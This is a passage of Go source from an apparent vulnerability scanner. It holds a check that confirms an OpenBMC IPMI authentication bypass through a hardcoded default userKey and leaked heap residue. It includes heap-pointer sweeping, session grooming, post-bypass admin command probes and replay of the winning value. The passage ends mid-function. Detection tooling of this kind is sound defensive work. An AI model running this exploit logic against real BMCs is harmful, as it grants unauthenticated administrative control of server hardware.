package check

import (
	"context"
	"crypto/hmac"
	"crypto/md5"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"hash"
	"math"
	"strconv"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/engine"
	"github.com/runZeroInc/oobscan/pkg/ipmi"
)

// openbmcDefaultUserKey is the hardcoded default userKey in phosphor-net-ipmid
// auth_algo.hpp: std::array<uint8_t, 20> userKey = {"0penBmc"}.
//
// phosphor-net-ipmid passes userKey.data(), userKey.size() to HMAC, so the key is
// the full 20-byte array, not the 8-byte string: the aggregate initializer copies
// "0penBmc" and zero-fills the rest.
var openbmcDefaultUserKey = func() []byte {
	key := make([]byte, 20)
	copy(key, "0penBmc")
	return key
}()

const openBMCDefaultUserKeyFullTestOption = "--ipmi-openbmc-default-userkey"

func init() {
	Register(Check{
		Name:        "ipmi.openbmc.defaultUserKeyAuthBypass",
		Description: "OpenBMC phosphor-net-ipmid authentication bypass via hardcoded default userKey: RAKP1 early-exit leaves userKey=\"0penBmc\" and bmc-random uninitialized. Heap reuse from a prior RAKP1 leaks the stale bmc-random, allowing RAKP3 HMAC computation without credentials. Default scans run one bounded patch-status handshake on ANY IPMI 2.0 host (the daemon is white-labeled into products that do not fingerprint as OpenBMC); the full heap-pointer sweep stays opt-in via --ipmi-openbmc-default-userkey. The sweep is deliberately serial -- concurrent setup sessions grow and fragment the netipmid heap and move the very pointer being guessed -- so narrowing the range with --ipmi-openbmc-userkey-heap-start/-end (from /proc/<netipmid-pid>/maps) is what makes it tractable, and the per-target budget must be raised to match (see --target-timeout)",
		Category:    "auth",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runOpenBMCDefaultUserKeyBypass,
	})
	RegisterExplain("ipmi.openbmc.defaultUserKeyAuthBypass", explainOpenBMCDefaultUserKeyBypass)
}

// DefaultUserKeyBypassProbe captures the full evidence chain for the default
// userKey authentication bypass via heap-reuse of bmc-random.
type DefaultUserKeyBypassProbe struct {
	// Suite is the cipher suite negotiated for the probe.
	Suite int `json:"suite"`
	// AuthAlgo, IntegrityAlgo, ConfAlgo are the negotiated algorithms.
	AuthAlgo      byte `json:"authAlgo,omitempty"`
	IntegrityAlgo byte `json:"integrityAlgo,omitempty"`
	ConfAlgo      byte `json:"confAlgo,omitempty"`
	// BMCSID is the BMC session ID from the Open Session response.
	BMCSID uint32 `json:"bmcSid"`
	// ClientSID is the client session ID we chose.
	ClientSID uint32 `json:"clientSid"`
	// ClientRand is the 16-byte random number we sent in RAKP1.
	ClientRand []byte `json:"clientRand,omitempty"`
	// RAKP1Status is the RAKP2 status code from the early-exit RAKP1.
	// Expected: 0x0a (UNAUTH_ROLE_PRIV) when req_max_privilege_level=CALLBACK.
	RAKP1Status byte `json:"rakp1Status"`
	// RAKP1StatusName is the human-readable name for RAKP1Status.
	RAKP1StatusName string `json:"rakp1StatusName,omitempty"`
	// RAKP3Status is the RAKP4 status code from the RAKP3 with the default key.
	// 0x00 = success (authentication bypassed).
	RAKP3Status byte `json:"rakp3Status"`
	// RAKP3StatusName is the human-readable name for RAKP3Status.
	RAKP3StatusName string `json:"rakp3StatusName,omitempty"`
	// AuthBypassed is true when RAKP3Status == 0x00.
	AuthBypassed bool `json:"authBypassed"`
	// WinBMCRand is the 16-byte stale bmc-random candidate that produced the
	// accepted RAKP3 HMAC (set only when AuthBypassed is true). This is the value
	// an operator can feed back via --ipmi-openbmc-userkey-bmcrand for a
	// deterministic retest.
	WinBMCRand []byte `json:"winBmcRand,omitempty"`
	// Attempts is the number of RAKP3 candidates tried during the probe.
	Attempts int `json:"attempts,omitempty"`
	// SweptCandidates / PlannedCandidates describe how much of the heap-pointer
	// plan the sweep actually got through, and SweepTruncated records whether it
	// stopped because it ran out of time rather than out of candidates. Without
	// these a deadline-truncated sweep is indistinguishable from an exhaustive
	// miss, and a vulnerable host silently files as precondition-only.
	SweptCandidates   int  `json:"sweptCandidates,omitempty"`
	PlannedCandidates int  `json:"plannedCandidates,omitempty"`
	SweepTruncated    bool `json:"sweepTruncated,omitempty"`
	// SweepStart / SweepEnd are the resolved sweep bounds, so the reported
	// coverage can be checked against the range the operator meant to give.
	SweepStart uint32 `json:"sweepStart,omitempty"`
	SweepEnd   uint32 `json:"sweepEnd,omitempty"`
	// ReplyRTT is the latency of this handshake's first answered request. The
	// sweep feeds it to sweepPacer to size the next candidate's timeout.
	ReplyRTT time.Duration `json:"-"`
	// UsernameUsed is the username we sent in RAKP1 (e.g. "root").
	UsernameUsed string `json:"usernameUsed"`
	// ReqPrivLevel is the requested privilege level from Open Session (ADMIN).
	ReqPrivLevel byte `json:"reqPrivLevel"`
	// PostBypass holds post-bypass capability probes (set when AuthBypassed=true).
	PostBypass *BypassPostProbe `json:"postBypass,omitempty"`
	// Error captures any transport-level error.
	Error string `json:"error,omitempty"`
}

// BypassPostProbe records the IPMI command access granted after a successful
// defaultUserKey RAKP3 bypass. It covers two paths:
//
//  1. Direct cleartext commands on the bypassed session itself.
//  2. Cross-socket RAKP1 relabel: a second connection sends RAKP1 to the
//     bypassed session's bmcSID (overwriting user/priv/keys), then both the
//     original (cB) and the relabelling (cC) connections attempt commands.
type BypassPostProbe struct {
	// Direct commands: sent from the bypassed connection before any relabelling.
	DirectPrivQueryCC      byte   `json:"directPrivQueryCc"`
	DirectPrivQueryData    []byte `json:"directPrivQueryData,omitempty"`
	DirectSetPrivAdminCC   byte   `json:"directSetPrivAdminCc"`
	DirectSetPrivAdminData []byte `json:"directSetPrivAdminData,omitempty"`
	DirectSOLStatusCC      byte   `json:"directSolStatusCc"`
	DirectSOLStatusData    []byte `json:"directSolStatusData,omitempty"`
	DirectGetDeviceIDCC    byte   `json:"directGetDeviceIdCc"`
	DirectGetDeviceIDData  []byte `json:"directGetDeviceIdData,omitempty"`
	DirectCommandsWork     bool   `json:"directCommandsWork"`
	// CrossRAKP1: a second connection sends RAKP1 to the bypassed session,
	// relabelling it with root's actual credentials.
	CrossRAKP1Status     byte   `json:"crossRakp1Status"`
	CrossRAKP1StatusName string `json:"crossRakp1StatusName,omitempty"`
	CrossRAKP1Error      string `json:"crossRakp1Error,omitempty"`
	CrossBMCRand         []byte `json:"crossBmcRand,omitempty"`
	// CrossRAKP3: attempt to re-key the session via RAKP3 from cC using the
	// new bmcRandom and the default userKey. 0x00 means the session accepted
	// the re-keying.
	CrossRAKP3Status     byte   `json:"crossRakp3Status"`
	CrossRAKP3StatusName string `json:"crossRakp3StatusName,omitempty"`
	// Commands from the original (cB) connection after cross-socket RAKP1.
	CrossBPrivQueryCC      byte   `json:"crossBPrivQueryCc"`
	CrossBPrivQueryData    []byte `json:"crossBPrivQueryData,omitempty"`
	CrossBSetPrivAdminCC   byte   `json:"crossBSetPrivAdminCc"`
	CrossBSetPrivAdminData []byte `json:"crossBSetPrivAdminData,omitempty"`
	CrossBSOLStatusCC      byte   `json:"crossBSolStatusCc"`
	CrossBSOLStatusData    []byte `json:"crossBSolStatusData,omitempty"`
	CrossBGetDeviceIDCC    byte   `json:"crossBGetDeviceIdCc"`
	CrossBGetDeviceIDData  []byte `json:"crossBGetDeviceIdData,omitempty"`
	// Commands from the relabelling (cC) connection.
	CrossCPrivQueryCC      byte   `json:"crossCPrivQueryCc"`
	CrossCPrivQueryData    []byte `json:"crossCPrivQueryData,omitempty"`
	CrossCSetPrivAdminCC   byte   `json:"crossCSetPrivAdminCc"`
	CrossCSetPrivAdminData []byte `json:"crossCSetPrivAdminData,omitempty"`
	CrossCGetDeviceIDCC    byte   `json:"crossCGetDeviceIdCc"`
	CrossCGetDeviceIDData  []byte `json:"crossCGetDeviceIdData,omitempty"`
	CrossCommandsWork      bool   `json:"crossCommandsWork"`
}

func runOpenBMCDefaultUserKeyBypass(ctx context.Context, t *engine.Target) []engine.Finding {
	if t == nil {
		return nil
	}
	fullTest := t.OpenBMCDefaultUserKey
	port := t.IPMIPort()
	timeout := t.Timeout
	if timeout == 0 {
		timeout = 5 * time.Second
	}

	// Default scan: one bounded patch-status handshake against any host that
	// negotiates an IPMI 2.0 RAKP cipher suite, not just self-identified OpenBMC --
	// phosphor-net-ipmid is white-labeled into products that fingerprint as
	// something else. The unpatched signature is RAKP1=0x0a (CALLBACK early-exit)
	// followed by RAKP4=0x0f (the forged-HMAC comparison was reached); the
	// expensive heap-pointer sweep stays opt-in.

	// Step 1: Find a cipher suite without consuming RMCP+ setup slots. The
	// Identify phase normally stores the advertised suite IDs as ipmi.ciphers;
	// use those first. Falling back to EnumCipherSuites15 is sessionless and does
	// not leave half-open RAKP state behind. Avoid DoRAKP12 here: it opens a
	// setup session and can exhaust OpenBMC's small in-setup session pool.
	var advertised []int
	if v, ok := t.Evidenced("ipmi.ciphers"); ok {
		advertised, _ = v.([]int)
	}
	if len(advertised) == 0 {
		if ids, _, err := ipmi.EnumCipherSuites15(t.Host, port, timeout); err == nil {
			advertised = ids
		}
	}
	suites := ipmi.CipherTriples(advertised)
	fallbackSuites := false
	if len(suites) == 0 {
		// phosphor-net-ipmid (and the vendor BMCs derived from it) do not answer the
		// sessionless IPMI 1.5 cipher-suite enumeration, so an empty list here is
		// expected on exactly the stacks this check targets -- bailing would silently
		// skip them. Fall back to the RMCP+ suites phosphor-net-ipmid always supports
		// (17 = HMAC-SHA256, 3 = HMAC-SHA1). The IPMI-presence gate keeps us from
		// opening a setup session against non-IPMI hosts on 623.
		if !hostSpeaksIPMI(t) {
			return nil // not an IPMI host, or no RAKP cipher suite discoverable
		}
		suites = defaultProbeCipherSuites()
		fallbackSuites = true
	}

	if !fullTest {
		probe := probeDefaultUserKeyPatchStatusOverSuites(t.Host, port, suites, timeout, fallbackSuites)
		if probe == nil {
			return nil
		}
		if t.DebugLog != nil {
			t.DebugLog(fmt.Sprintf("ipmi.defaultUserKey: patch probe suite=%d attempts=%d rakp1=0x%02x(%s) rakp3=0x%02x(%s) bypass=%t err=%q",
				probe.Suite, probe.Attempts,
				probe.RAKP1Status, probe.RAKP1StatusName,
				probe.RAKP3Status, probe.RAKP3StatusName,
				probe.AuthBypassed, probe.Error))
		}
		if probe.AuthBypassed {
			return reportDefaultUserKeyBypass(t, probe, port)
		}
		if !defaultUserKeyPatchAbsent(probe) {
			return nil
		}

		// Unpatched signature seen. The residue is drawn fresh per session, so
		// re-rolling the hot constant-string set confirms cheaply; only the sweep
		// stays behind --ipmi-openbmc-default-userkey. Confirming activates an
		// unauthenticated session, so it honors --disable-logins.
		if t.DisableLogins {
			return stampIPMI([]engine.Finding{defaultUserKeyPatchLeadFinding(probe, probe.Attempts)}, port)
		}
		conf := probeDefaultUserKeyBypass(ctx, userKeySearch{
			host: t.Host, port: port, timeout: timeout,
			suite:      ipmi.CipherAlgos{Suite: probe.Suite, Auth: probe.AuthAlgo, Integrity: probe.IntegrityAlgo, Conf: probe.ConfAlgo},
			debugLog:   t.DebugLog,
			progress:   t.Progress,
			fastRounds: defaultUserKeyFastRounds,
			skipSweep:  true,
		})
		if conf != nil && conf.AuthBypassed {
			return reportDefaultUserKeyBypass(t, conf, port)
		}
		attempts := probe.Attempts
		if conf != nil {
			attempts += conf.Attempts
		}
		return stampIPMI([]engine.Finding{defaultUserKeyPatchLeadFinding(probe, attempts)}, port)
	}

	// Options. An operator with shell access can sample the live stale bmc-random
	// (see the check description) and pass it back with --ipmi-openbmc-userkey-bmcrand
	// for a deterministic retest; it is tried first. The heap-pointer sweep bounds
	// and optional in-page offset(s) tune the blind search and can be narrowed to
	// the live [heap] extent from /proc/<netipmid-pid>/maps.
	var supplied []byte
	if t.OpenBMCUserKeyBMCRand != "" {
		cand, err := parseUserSuppliedBMCRand(t.OpenBMCUserKeyBMCRand)
		if err != nil {
			if t.DebugLog != nil {
				t.DebugLog(fmt.Sprintf("ipmi.defaultUserKey: ignoring --ipmi-openbmc-userkey-bmcrand %q: %v", t.OpenBMCUserKeyBMCRand, err))
			}
		} else {
			supplied = cand
		}
	}
	sweepStart, err := parseHeapAddr(t.OpenBMCUserKeyHeapStart, defaultUserKeySweepStart)
	if err != nil && t.DebugLog != nil {
		t.DebugLog("ipmi.defaultUserKey: " + err.Error() + " (using default start)")
	}
	sweepEnd, err := parseHeapAddr(t.OpenBMCUserKeyHeapEnd, defaultUserKeySweepEnd)
	if err != nil && t.DebugLog != nil {
		t.DebugLog("ipmi.defaultUserKey: " + err.Error() + " (using default end)")
	}
	if sweepEnd <= sweepStart {
		sweepStart, sweepEnd = defaultUserKeySweepStart, defaultUserKeySweepEnd
	}
	pageOffsets := parsePageOffsets(t.OpenBMCUserKeyPageOffset)

	probe := probeDefaultUserKeyBypass(ctx, userKeySearch{
		host: t.Host, port: port, timeout: timeout, suite: suites[0],
		debugLog: t.DebugLog, progress: t.Progress,
		supplied:   supplied,
		sweepStart: sweepStart, sweepEnd: sweepEnd, pageOffsets: pageOffsets,
		fastRounds: defaultUserKeyFastRounds,
		skipFast:   t.OpenBMCUserKeySkipFast,
	})
	if probe == nil {
		return nil
	}
	if t.DebugLog != nil {
		t.DebugLog(fmt.Sprintf("ipmi.defaultUserKey: suite=%d attempts=%d rakp1=0x%02x(%s) rakp3=0x%02x(%s) bypass=%t err=%q",
			probe.Suite, probe.Attempts,
			probe.RAKP1Status, probe.RAKP1StatusName,
			probe.RAKP3Status, probe.RAKP3StatusName,
			probe.AuthBypassed, probe.Error))
	}
	if probe.AuthBypassed {
		return reportDefaultUserKeyBypass(t, probe, port)
	}
	if probe.RAKP1Status == 0x0a {
		return stampIPMI([]engine.Finding{defaultUserKeyPreconditionFinding(probe, probe.Attempts, supplied != nil)}, port)
	}
	return nil
}

// reportDefaultUserKeyBypass is the single exit for a confirmed bypass. Every
// confirming path must route through it: emitting the finding without publishing the
// winning residue leaves the bypass unchainable by later stages.
func reportDefaultUserKeyBypass(t *engine.Target, probe *DefaultUserKeyBypassProbe, port int) []engine.Finding {
	publishOpenBMCUserKeyEvidence(t, probe)
	return stampIPMI([]engine.Finding{defaultUserKeyCriticalFinding(probe)}, port)
}

// publishOpenBMCUserKeyEvidence stores a successful default-userKey bypass so later
// stages can reopen the session: the stale bmcRandomNum that produced the accepted
// RAKP3 HMAC lets OpenSession20OpenBMCBypass reach CALLBACK again with no password.
//
// The gate is on length rather than content -- the all-zero cold-boot residue is a
// legitimate winning value and replays like any other.
func publishOpenBMCUserKeyEvidence(t *engine.Target, probe *DefaultUserKeyBypassProbe) {
	if t == nil || probe == nil || !probe.AuthBypassed || len(probe.WinBMCRand) != 16 {
		return
	}
	t.SetEvidence("ipmi.openBmcDefaultUserKey", probe)
}

func defaultUserKeyCriticalFinding(probe *DefaultUserKeyBypassProbe) engine.Finding {
	bp := probe.PostBypass
	postSummary := "postBypass=not-probed"
	if bp != nil {
		switch {
		case bp.DirectCommandsWork:
			postSummary = fmt.Sprintf(
				"postBypass=direct-cmds-work directPrivQueryCc=0x%02x directSetPrivAdminCc=0x%02x directSOLStatusCc=0x%02x directGetDeviceIdCc=0x%02x",
				bp.DirectPrivQueryCC, bp.DirectSetPrivAdminCC, bp.DirectSOLStatusCC, bp.DirectGetDeviceIDCC,
			)
		case bp.CrossCommandsWork:
			postSummary = fmt.Sprintf(
				"postBypass=cross-relabel-cmds-work crossRakp1Status=0x%02x crossRakp3Status=0x%02x crossBSetPrivAdminCc=0x%02x crossBGetDeviceIdCc=0x%02x crossCSetPrivAdminCc=0x%02x crossCGetDeviceIdCc=0x%02x",
				bp.CrossRAKP1Status, bp.CrossRAKP3Status, bp.CrossBSetPrivAdminCC, bp.CrossBGetDeviceIDCC, bp.CrossCSetPrivAdminCC, bp.CrossCGetDeviceIDCC,
			)
		case bp.CrossRAKP3Status == 0x00:
			// Cross-socket RAKP1 relabel + RAKP3 re-key both accepted by the server.
			// The session is now fully re-authenticated with the default userKey.
			// Cleartext commands are rejected by active-session integrity enforcement,
			// but the session SIK is now known and derivable; full IPMI 2.0 command
			// access requires computing K1=HMAC(SIK,0x01||zeros) and framing packets
			// with integrity trailers.
			postSummary = fmt.Sprintf(
				"postBypass=cross-rekey-accepted crossRakp1Status=0x%02x crossRakp3Status=0x%02x(session-rekeyed) directPrivQueryCc=0x%02x directSetPrivAdminCc=0x%02x crossBSetPrivAdminCc=0x%02x crossCSetPrivAdminCc=0x%02x session-sik-derivable=true",
				bp.CrossRAKP1Status, bp.CrossRAKP3Status,
				bp.DirectPrivQueryCC, bp.DirectSetPrivAdminCC,
				bp.CrossBSetPrivAdminCC, bp.CrossCSetPrivAdminCC,
			)
		default:
			postSummary = fmt.Sprintf(
				"postBypass=no-cmds directPrivQueryCc=0x%02x directSetPrivAdminCc=0x%02x directSOLStatusCc=0x%02x directGetDeviceIdCc=0x%02x crossRakp1Status=0x%02x crossRakp3Status=0x%02x crossBSetPrivAdminCc=0x%02x crossCSetPrivAdminCc=0x%02x",
				bp.DirectPrivQueryCC, bp.DirectSetPrivAdminCC, bp.DirectSOLStatusCC, bp.DirectGetDeviceIDCC,
				bp.CrossRAKP1Status, bp.CrossRAKP3Status, bp.CrossBSetPrivAdminCC, bp.CrossCSetPrivAdminCC,
			)
		}
	}
	bmcRandHex := hex.EncodeToString(probe.WinBMCRand)
	// The bytes 4-7 of the residue are the leaked heap pointer; surface it as a
	// readable address so an operator can correlate it with a heap sample and
	// re-supply it via --ipmi-openbmc-userkey-bmcrand.
	bmcRandPtr := ""
	if len(probe.WinBMCRand) == 16 {
		bmcRandPtr = fmt.Sprintf("0x%08x", binary.LittleEndian.Uint32(probe.WinBMCRand[4:8]))
	}
	return engine.Finding{
		Check:    "ipmi.openbmc.defaultUserKeyAuthBypass",
		Category: "auth",
		Risk:     "critical",
		CVE:      []string{"CVE-2026-16141"},
		Fields: engine.F(
			"suite", fmt.Sprintf("%d", probe.Suite),
			"authAlgo", fmt.Sprintf("0x%02x", probe.AuthAlgo),
			"bmcSid", fmt.Sprintf("0x%08x", probe.BMCSID),
			"rakp1Status", fmt.Sprintf("0x%02x", probe.RAKP1Status),
			"rakp1StatusName", probe.RAKP1StatusName,
			"rakp3Status", fmt.Sprintf("0x%02x", probe.RAKP3Status),
			"rakp3StatusName", probe.RAKP3StatusName,
			"authBypassed", "true",
			"usernameUsed", probe.UsernameUsed,
			"reqPrivLevel", fmt.Sprintf("0x%02x", probe.ReqPrivLevel),
			"bmc-random", bmcRandHex,
			"bmc-randomHeapPtr", bmcRandPtr,
			"requiresCredentials", "false",
			"proof", proofKV(
				"openSession", "ok",
				"bmcSid", fmt.Sprintf("0x%08x", probe.BMCSID),
				"suite", fmt.Sprintf("%d", probe.Suite),
				"rakp1Status", fmt.Sprintf("0x%02x", probe.RAKP1Status),
				"rakp1StatusName", probe.RAKP1StatusName,
				"rakp3Status", fmt.Sprintf("0x%02x", probe.RAKP3Status),
				"rakp3StatusName", probe.RAKP3StatusName,
				"authBypassed", "true",
				"bmcRandom", bmcRandHex,
				"heapPtr", bmcRandPtr,
			)+" "+postSummary,
		),
	}
}

func defaultUserKeyPreconditionFinding(probe *DefaultUserKeyBypassProbe, attempts int, targeted bool) engine.Finding {
	// A sweep cut short by the target deadline covered only part of the plan, so
	// "not confirmed" means "not finished", not "not vulnerable". Say which, and
	// carry the coverage so the distinction survives into the output.
	status := "precondition-observed-not-confirmed"
	if probe.SweepTruncated {
		status = "precondition-observed-sweep-truncated"
	}
	fields := []string{
		"suite", fmt.Sprintf("%d", probe.Suite),
		"authAlgo", fmt.Sprintf("0x%02x", probe.AuthAlgo),
		"bmcSid", fmt.Sprintf("0x%08x", probe.BMCSID),
		"rakp1Status", fmt.Sprintf("0x%02x", probe.RAKP1Status),
		"rakp1StatusName", probe.RAKP1StatusName,
		"rakp3Status", fmt.Sprintf("0x%02x", probe.RAKP3Status),
		"rakp3StatusName", probe.RAKP3StatusName,
		"authBypassed", "false",
		"status", status,
		"attempts", fmt.Sprintf("%d", attempts),
		"requiresCredentials", "false",
	}
	if probe.PlannedCandidates > 0 {
		fields = append(fields,
			"sweepCoverage", fmt.Sprintf("%d/%d", probe.SweptCandidates, probe.PlannedCandidates),
			"sweepRange", fmt.Sprintf("0x%08x-0x%08x", probe.SweepStart, probe.SweepEnd))
	}
	fields = append(fields, "proof", proofKV(
		"rakp1Status", fmt.Sprintf("0x%02x", probe.RAKP1Status),
		"attempts", fmt.Sprintf("%d", attempts),
		"targeted", ternary(targeted, "true", "false"),
		"authBypassed", "false"))
	return engine.Finding{
		Check:    "ipmi.openbmc.defaultUserKeyAuthBypass",
		Category: "auth",
		Risk:     "medium",
		Fields:   engine.F(fields...),
	}
}

func defaultUserKeyPatchAbsent(probe *DefaultUserKeyBypassProbe) bool {
	return probe != nil && probe.RAKP1Status == 0x0a && probe.RAKP3Status == 0x0f
}

// defaultUserKeyPatchLeadFinding reports the unpatched state-machine signature
// without a confirmed activation. attempts is the total spent, including the
// auto-confirm fast rounds, so the reader can tell "we did not try" from "we
// re-rolled the residue N times and it never landed on a known value".
func defaultUserKeyPatchLeadFinding(probe *DefaultUserKeyBypassProbe, attempts int) engine.Finding {
	status := "full-test-recommended"
	if attempts > probe.Attempts {
		status = "auto-confirm-exhausted-full-test-recommended"
	}
	return engine.Finding{
		Check:    "ipmi.openbmc.defaultUserKeyAuthBypass",
		Category: "auth",
		Risk:     "medium",
		Fields: engine.F(
			"suite", fmt.Sprintf("%d", probe.Suite),
			"authAlgo", fmt.Sprintf("0x%02x", probe.AuthAlgo),
			"bmcSid", fmt.Sprintf("0x%08x", probe.BMCSID),
			"rakp1Status", fmt.Sprintf("0x%02x", probe.RAKP1Status),
			"rakp1StatusName", probe.RAKP1StatusName,
			"rakp3Status", fmt.Sprintf("0x%02x", probe.RAKP3Status),
			"rakp3StatusName", probe.RAKP3StatusName,
			"authBypassed", "false",
			"patchStatus", "likely-unpatched",
			"status", status,
			"attempts", fmt.Sprintf("%d", attempts),
			"fullTestOption", openBMCDefaultUserKeyFullTestOption,
			"requiresCredentials", "false",
			"proof", proofKV(
				"rakp1Status", fmt.Sprintf("0x%02x", probe.RAKP1Status),
				"rakp1StatusName", probe.RAKP1StatusName,
				"rakp3Status", fmt.Sprintf("0x%02x", probe.RAKP3Status),
				"rakp3StatusName", probe.RAKP3StatusName,
				"attempts", fmt.Sprintf("%d", attempts),
			),
		),
	}
}

// makeHeapResidue builds a 16-byte stale bmc-random candidate for the given
// heap address. The invariant pattern is:
//
//	[00 00 00 00] [addr LE32] [00 00 00 00] [65 00 00 00]
func makeHeapResidue(addr uint32) []byte {
	c := make([]byte, 16)
	c[4] = byte(addr)
	c[5] = byte(addr >> 8)
	c[6] = byte(addr >> 16)
	c[7] = byte(addr >> 24)
	c[12] = 0x65
	return c
}

// Default heap-pointer sweep range for the blind (no-value) mode: a window wide
// enough to contain the netipmid [heap] extent across builds and restarts. An
// operator with shell access can narrow it to the live heap with
// --ipmi-openbmc-userkey-heap-start / -end.
const (
	defaultUserKeySweepStart = uint32(0x00200000)
	defaultUserKeySweepEnd   = uint32(0x03000000)
)

// defaultUserKeyPageOffsets are the known in-page offsets (low 12 bits) of the
// leaked heap pointer. The pointer is a page-aligned heap_base plus a build-stable
// struct offset, so its low 12 bits are stable and the sweep can stride these
// offsets one heap page per attempt before falling back to every 4-byte-aligned
// offset. Offsets from one cluster vary slightly with allocator grooming.
var defaultUserKeyPageOffsets = []uint32{0x740, 0x890, 0xe58, 0xae8, 0x648, 0x5e0, 0x1b0}

// maxSweepAttemptTimeout is the ceiling (and cold-start value) for the
// per-candidate RAKP timeout during the sweep. Client.Send waits the full timeout
// for every reply, so inheriting a multi-second --timeout makes each dropped setup
// packet cost seconds. A shorter --timeout still applies. Past the first sample the
// sweep paces itself off measured reply latency (see sweepPacer).
//
// sweepAttemptRetries re-tests a candidate whose handshake did not complete, so a
// dropped reply cannot silently retire a candidate, including the winning one.
const (
	maxSweepAttemptTimeout = 750 * time.Millisecond
	minSweepAttemptTimeout = 40 * time.Millisecond
	sweepAttemptRetries    = 2
)

// defaultUserKeyFastRounds is how many times the constant-string candidate set is
// re-rolled before falling back to the heap-pointer sweep. The residue is drawn
// fresh per session, so each round is an independent trial and re-rolling is far
// cheaper than the pointer sweep.
const defaultUserKeyFastRounds = 96

// Grooming parameters. The hot "e IPMI LAN sessi" residue comes from the
// phosphor-logging "Removing idle IPMI LAN session" buffer, which is only
// allocated and freed when cleanStaleEntries() has a stale session to report --
// and that runs at the start of every startSession(), just before the new
// session's auth algorithm is allocated. A cleanly closed session never goes
// stale, so the close-on-miss the sweep needs would suppress the residue
// entirely; the fast phase deliberately abandons a few sessions to keep
// cleanStaleEntries() busy. The population is capped because abandoned sessions
// occupy the same setup slots our own probing needs.
const (
	defaultUserKeyGroomEvery = 4  // re-groom every Nth fast round
	defaultUserKeyGroomBatch = 3  // sessions abandoned per groom
	defaultUserKeyGroomMax   = 24 // total abandoned per run
)

// groomAbandonSession is the check's alias for ipmi.GroomAbandonSetupSession,
// the shared grooming primitive (see pkg/ipmi/openbmc_residues.go).
func groomAbandonSession(host string, port int, suite ipmi.CipherAlgos, timeout time.Duration, cSID uint32) bool {
	return ipmi.GroomAbandonSetupSession(host, port, suite, timeout, cSID)
}

// defaultUserKeyColdEvery folds the exhaustive sliding-window set into every Nth
// fast round. Each attempt is a single draw, so the confirmed residues keep the
// bulk of the budget while occasional cold rounds still reach a build whose window
// offset is not in the known set.
const defaultUserKeyColdEvery = 8

// printableResidue renders a residue for logging when it is ASCII text, which is
// the interesting case: it names the source string the heap chunk last held.
func printableResidue(b []byte) string {
	for _, c := range b {
		if c < 0x20 || c > 0x7e {
			return ""
		}
	}
	return string(b)
}

// sweepPacer sizes the per-candidate timeout from the target's own measured reply
// latency instead of paying a fixed worst-case wait on every dropped packet. It is
// the Jacobson/Karels estimator TCP uses for its retransmission timeout: wait
// srtt + 4*rttvar, doubling on backoff. An over-tight wait is safe because the
// candidate is retried (sweepAttemptRetries) rather than retired.
type sweepPacer struct {
	srtt   time.Duration // smoothed round-trip time
	rttvar time.Duration // smoothed mean deviation
	ceil   time.Duration
	shift  uint // consecutive-failure backoff exponent
	n      int
}

func newSweepPacer(ceil time.Duration) *sweepPacer {
	if ceil <= 0 || ceil > maxSweepAttemptTimeout {
		ceil = maxSweepAttemptTimeout
	}
	return &sweepPacer{ceil: ceil}
}

// observe records the latency of one answered request and clears any backoff.
func (p *sweepPacer) observe(d time.Duration) {
	if d <= 0 {
		return
	}
	if p.n == 0 {
		p.srtt, p.rttvar = d, d/2
	} else {
		diff := p.srtt - d
		if diff < 0 {
			diff = -diff
		}
		p.rttvar += (diff - p.rttvar) / 4
		p.srtt += (d - p.srtt) / 8
	}
	p.n++
	p.shift = 0
}

// backoff doubles the wait after a request went unanswered, so a target that has
// started dropping (a full setup-session pool, a busy BMC) is given more room
// instead of being retried at a rate it has already shown it cannot meet.
func (p *sweepPacer) backoff() {
	if p.shift < 4 {
		p.shift++
	}
}

// timeout returns the wait to use for the next request.
func (p *sweepPacer) timeout() time.Duration {
	if p.n == 0 {
		return p.ceil // no samples yet: assume the worst
	}
	t := (p.srtt + 4*p.rttvar) << p.shift
	return min(max(t, minSweepAttemptTimeout), p.ceil)
}

// parseHeapAddr parses a hex heap address (with or without a "0x" prefix). An
// empty string yields def. It is used for the operator-tunable sweep bounds.
func parseHeapAddr(s string, def uint32) (uint32, error) {
	t := strings.TrimSpace(s)
	if t == "" {
		return def, nil
	}
	t = strings.TrimPrefix(strings.TrimPrefix(t, "0x"), "0X")
	v, err := strconv.ParseUint(t, 16, 32)
	if err != nil {
		return def, fmt.Errorf("invalid heap address %q: %w", s, err)
	}
	return uint32(v), nil
}

// parsePageOffsets parses one or more comma-separated in-page offsets (hex, with
// or without "0x") into masked (0-0xfff) values. The leaked heap pointer that
// lands in bmc-random has a stable in-page offset for a given build (observed
// 0xae8 on the reference build), so restricting the blind sweep to that offset
// lets it step one page at a time instead of every 4-byte-aligned address.
// An empty string yields nil (the sweep then steps through all offsets).
func parsePageOffsets(s string) []uint32 {
	if strings.TrimSpace(s) == "" {
		return nil
	}
	var out []uint32
	seen := map[uint32]bool{}
	for part := range strings.SplitSeq(s, ",") {
		p := strings.TrimSpace(part)
		if p == "" {
			continue
		}
		p = strings.TrimPrefix(strings.TrimPrefix(p, "0x"), "0X")
		v, err := strconv.ParseUint(p, 16, 32)
		if err != nil {
			continue
		}
		off := uint32(v) & 0xfff
		if !seen[off] {
			seen[off] = true
			out = append(out, off)
		}
	}
	return out
}

// parseUserSuppliedBMCRand parses the stale bmc-random given with
// --ipmi-openbmc-userkey-bmcrand, for a deterministic retest against a value
// sampled from the live BMC. Either form is accepted, ignoring an optional "0x"
// prefix and any spaces, colons, dashes, or underscores:
//
//   - a 4-byte heap pointer, the bytes 4-7 of the residue written as a normal
//     address (for example "0x0066e020"). It is wrapped into the observed
//     residue layout 00000000 <ptr little-endian> 00000000 65000000.
//   - a full 16-byte bmc-random (32 hex digits), used verbatim.
func parseUserSuppliedBMCRand(s string) ([]byte, error) {
	clean := strings.Map(func(r rune) rune {
		switch r {
		case ' ', ':', '-', '_', '\t':
			return -1
		}
		return r
	}, strings.TrimSpace(s))
	clean = strings.TrimPrefix(clean, "0x")
	clean = strings.TrimPrefix(clean, "0X")
	if clean == "" {
		return nil, fmt.Errorf("empty value")
	}
	raw, err := hex.DecodeString(clean)
	if err != nil {
		return nil, fmt.Errorf("not valid hex: %w", err)
	}
	switch len(raw) {
	case 16:
		return raw, nil
	case 4:
		// The four bytes are a heap address as a human writes it (big-endian
		// text); makeHeapResidue stores it little-endian in bytes 4-7.
		return makeHeapResidue(binary.BigEndian.Uint32(raw)), nil
	default:
